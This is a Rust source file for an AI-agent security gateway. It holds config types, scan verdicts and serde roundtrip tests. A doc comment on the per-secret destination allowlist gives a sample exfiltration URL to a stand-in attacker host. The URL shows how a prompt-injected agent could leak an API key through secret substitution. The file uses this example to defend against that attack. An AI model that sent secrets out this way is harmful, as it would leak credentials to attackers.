use std::collections::HashMap;

use adversary_detector::ScannerCheckConfig;
use serde::{Deserialize, Serialize};

/// What action to take for a request/response.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum Verdict {
    /// Allow the traffic through.
    Allow,
    /// Block the traffic with a reason.
    Block { reason: String },
    /// Allow but log the finding.
    Log { finding: String },
}

/// Result of scanning outbound request content (exfiltration check).
#[derive(Debug, Clone)]
pub struct ExfilReport {
    pub verdict: Verdict,
    pub findings: Vec<String>,
    pub scan_time_ms: u64,
}

/// Result of scanning inbound response content (injection check).
#[derive(Debug, Clone)]
pub struct InjectionReport {
    pub verdict: Verdict,
    pub findings: Vec<String>,
    pub scan_time_ms: u64,
}

/// Configuration for the security gateway.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct GatewayConfig {
    /// Port to listen on (default: 8888; override with SECURITY_PROXY_PORT)
    pub port: u16,
    /// Path to CA certificate PEM (for MITM)
    pub ca_cert_path: Option<String>,
    /// Path to CA private key PEM
    pub ca_key_path: Option<String>,
    /// Enable exfiltration scanning on outbound requests
    pub scan_outbound: bool,
    /// Enable injection scanning on inbound responses
    pub scan_inbound: bool,
    /// Enable credential injection from env/vault
    pub inject_credentials: bool,
    /// Domains that bypass the gateway entirely
    pub bypass_domains: Vec<String>,
    /// Log all traffic (even allowed) for audit
    pub audit_log: bool,
    /// Ordered adversary scanner checks for inbound and outbound proxy
    /// scanning. Empty uses the adversary-detector built-in Starlark default.
    #[serde(default)]
    pub scanner_checks: Vec<ScannerCheckConfig>,
    /// Per-secret destination allowlist. Keys are secret names (the
    /// `NAME` from `{{secret:NAME}}`); values are host patterns the
    /// secret may be substituted into. Patterns follow the same
    /// host-matching semantics as `bypass_domains`: exact-or-DNS-suffix
    /// for non-wildcard, glob with `*` matching `[^.]*` (no
    /// dot-crossing) for wildcard.
    ///
    /// Behavior:
    /// - Secret name absent from the map → no restriction (today's
    ///   behavior preserved; opt-in tightening).
    /// - Secret name present with empty list → DENY all destinations
    ///   (explicit lock-down for secrets you want to disable
    ///   substitution for entirely).
    /// - Secret name present with non-empty list → destination host
    ///   must match at least one pattern, else fail-closed.
    ///
    /// Per RFC §11.1 ("substituted-value exfiltration by the upstream
    /// itself"). Defends against a prompt-injected agent calling
    /// `https://attacker.example/?key={{secret:ANTHROPIC_API_KEY}}` —
    /// without an allowlist, the gateway would dutifully substitute
    /// and exfiltrate.
    #[serde(default)]
    pub secret_destination_allowlist: HashMap<String, Vec<String>>,
}

impl Default for GatewayConfig {
    fn default() -> Self {
        // CA paths default to None — when unset and the binary is run
        // standalone, main.rs auto-generates a persistent CA at
        // /var/lib/calciforge/ca.{pem,key} on first start (rcgen, mode
        // 0600 on the key). Operators who provision the CA out-of-band
        // override via SECURITY_PROXY_CA_CERT/_KEY.
        Self {
            port: 8888,
            ca_cert_path: None,
            ca_key_path: None,
            scan_outbound: true,
            scan_inbound: true,
            inject_credentials: true,
            bypass_domains: vec![
                "localhost".into(),
                "127.0.0.1".into(),
                "192.168.1.*".into(),
                "10.*.*.*".into(),
            ],
            audit_log: true,
            scanner_checks: Vec::new(),
            // Empty by default — preserves current behavior (no secret
            // is destination-locked). Operators opt in per-secret as
            // they tighten the deployment.
            secret_destination_allowlist: HashMap::new(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The default bypass list must include loopback so that the
    /// gateway doesn't proxy traffic to itself when a local client
    /// accidentally points at the gateway. This is an invariant, not
    /// a tautology against hard-coded constants.
    #[test]
    fn default_bypass_list_includes_loopback() {
        let config = GatewayConfig::default();
        let has_loopback = config
            .bypass_domains
            .iter()
            .any(|d| d == "localhost" || d == "127.0.0.1");
        assert!(
            has_loopback,
            "default bypass list must include a loopback pattern so the \
             gateway doesn't recurse when misconfigured — got: {:?}",
            config.bypass_domains
        );
    }

    /// MITM is now the only proxy mode; the binary always needs a CA to
    /// issue leaf certs at runtime. The default config must keep CA
    /// paths self-consistent — either both Some or both None — because
    /// the binary's auto-generation fallback only kicks in when both
    /// are unset. A half-set config (one path provided, the other
    /// missing) would race on startup. This test catches that
    /// regression class.
    #[test]
    fn default_config_ca_paths_are_self_consistent() {
        let config = GatewayConfig::default();
        let half_set = config.ca_cert_path.is_some() ^ config.ca_key_path.is_some();
        assert!(
            !half_set,
            "CA cert/key must be both set or both None, never one-of-two: \
             cert={:?} key={:?}",
            config.ca_cert_path, config.ca_key_path
        );
    }

    /// Structural JSON roundtrip preserves every field. The previous
    /// test only compared `port`, so adding a field with
    /// `#[serde(skip_serializing_if)]` or forgetting `Deserialize`
    /// would slip through silently.
    #[test]
    fn config_roundtrips_through_json_preserving_every_field() {
        let config = GatewayConfig {
            port: 54321,
            ca_cert_path: Some("/tmp/ca.pem".into()),
            ca_key_path: Some("/tmp/ca.key".into()),
            scan_outbound: false,
            scan_inbound: false,
            inject_credentials: false,
            bypass_domains: vec!["a.example".into(), "b.example".into()],
            audit_log: false,
            scanner_checks: vec![
                ScannerCheckConfig::RemoteHttp {
                    url: "http://127.0.0.1:9801".into(),
                    fail_closed: true,
                },
                ScannerCheckConfig::Starlark {
                    path: "/etc/calciforge/scanner.star".into(),
                    fail_closed: true,
                    max_callstack: 32,
                },
            ],
            secret_destination_allowlist: HashMap::from([
                ("MY_KEY".into(), vec!["api.example.com".into()]),
                ("LOCKED".into(), vec![]),
            ]),
        };
        let json = serde_json::to_string(&config).unwrap();
        let deserialized: GatewayConfig = serde_json::from_str(&json).unwrap();
        assert_eq!(config, deserialized, "roundtrip must preserve all fields");
    }

    /// Verdict variants survive JSON roundtrip with structural equality.
    /// Previously the test used `.contains("Block")` and `.contains("exfiltration")`
    /// which would pass on any string containing those substrings (e.g. a
    /// corrupted `{"Blocked":"…"}`).
    #[test]
    fn verdict_roundtrips_preserving_each_variant() {
        let cases = [
            Verdict::Allow,
            Verdict::Block {
                reason: "exfiltration detected".into(),
            },
            Verdict::Log {
                finding: "pii leak".into(),
            },
        ];
        for v in cases {
            let json = serde_json::to_string(&v).expect("serialize");
            let back: Verdict = serde_json::from_str(&json).expect("deserialize");
            assert_eq!(back, v, "variant must roundtrip structurally: {v:?}");
        }
    }
}
